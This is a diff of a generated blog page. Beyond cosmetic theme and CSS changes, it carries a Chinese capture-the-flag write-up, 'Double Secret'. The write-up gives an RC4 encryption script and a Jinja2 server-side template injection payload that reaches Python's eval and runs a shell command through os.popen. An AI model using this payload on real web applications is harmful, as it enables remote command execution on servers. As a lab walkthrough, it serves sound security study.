@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -172,7 +165,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0087.jpg') no-repeat center center;
+         style="background: url('https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152231002.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -199,7 +192,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      393 字
+      413 字
     </span>
   
 
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      12
+      6
        分钟
     </span>
   
@@ -245,6 +238,12 @@
             <!-- SEO header -->
             <h1 style="display: none">Double Secret</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id=""><a href="#" class="headerlink" title="_-__-"></a><code>_-__-</code></h2><p>打开是这样<br><img src="https://img10.360buyimg.com/ddimg/jfs/t1/172299/33/6670/3057/6087c133E05eb4964/f7d5c0725165dfea.png" srcset="/img/loading.gif" alt="01.png">       </p>
 <p>各种找，发现<code>robots.txt</code><br>有一句话—–<code>It is Android ctf</code><br>????    </p>
@@ -257,46 +256,46 @@
 <p>主要点：<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/189991/37/260/20393/6087c2e6E7772c1a4/0a96aad8ab0d1ac7.png" srcset="/img/loading.gif" alt="03.png">      </p>
 <p>对传入的参数进行RC4解密，然后经过<code>render_template_string</code><br>这里存在SSTI      </p>
 <p>RC4加密脚本         </p>
-<pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
-<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse
+<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
 
 
-<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token string">"init_key"</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 返回加密后得内容</span>
-    s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
-    crypt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> crypt
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_main</span>(<span class="hljs-params">key=<span class="hljs-string">&quot;init_key&quot;</span>, message=<span class="hljs-string">&quot;init_message&quot;</span></span>):</span>  <span class="hljs-comment"># 返回加密后得内容</span>
+    s_box = rc4_init_sbox(key)
+    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))
+    <span class="hljs-keyword">return</span> crypt
 
 
-<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    j <span class="token operator">=</span> <span class="token number">0</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
-        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
-    <span class="token keyword">return</span> s_box
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_init_sbox</span>(<span class="hljs-params">key</span>):</span>
+    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))
+    j = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
+        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span>
+        s_box[i], s_box[j] = s_box[j], s_box[i]
+    <span class="hljs-keyword">return</span> s_box
 
 
-<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>
-    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>
-        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
-        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
-        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
-        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
-        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>
-        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):</span>
+    res = []
+    i = j = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:
+        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
+        j = (j + box[i]) % <span class="hljs-number">256</span>
+        box[i], box[j] = box[j], box[i]
+        t = (box[i] + box[j]) % <span class="hljs-number">256</span>
+        k = box[t]
+        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))
+    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>)
 
 
-key <span class="token operator">=</span> <span class="token string">"HereIsTreasure"</span>  <span class="token comment"># 此处为密文</span>
-message <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入明文:\n"</span><span class="token punctuation">)</span>
-enc_base64 <span class="token operator">=</span> rc4_main<span class="token punctuation">(</span>key<span class="token punctuation">,</span> message<span class="token punctuation">)</span>
-enc_init <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc_base64<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>
-enc_url <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>enc_init<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"rc4加密后的url编码:"</span> <span class="token operator">+</span> enc_url<span class="token punctuation">)</span>
-<span class="token comment"># print("rc4加密后的base64编码"+enc_base64)</span></code></pre></code></pre>
+key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment"># 此处为密文</span>
+message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)
+enc_base64 = rc4_main(key, message)
+enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64), <span class="hljs-string">&#x27;utf-8&#x27;</span>)
+enc_url = parse.quote(enc_init)
+print(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span> + enc_url)
+<span class="hljs-comment"># print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></code></pre></div></code></pre>
 <p>明文输入SSTI的payload：<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>     </p>
 <p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/166916/2/20756/717273/6087c89fEf400f1c8/5d5e711f5e5060ff.png" srcset="/img/loading.gif" alt="05.png">      </p>
 <p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186127/13/1163/8759/6087c863E6220db00/67e1250969f3a7eb.png" srcset="/img/loading.gif" alt="04.png">        </p>
@@ -421,7 +420,7 @@ enc_url <span class="token operator">=</span> parse<span class="token punctuatio
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -447,8 +446,6 @@ enc_url <span class="token operator">=</span> parse<span class="token punctuatio
 
 
 
-  
-    
   
 
 
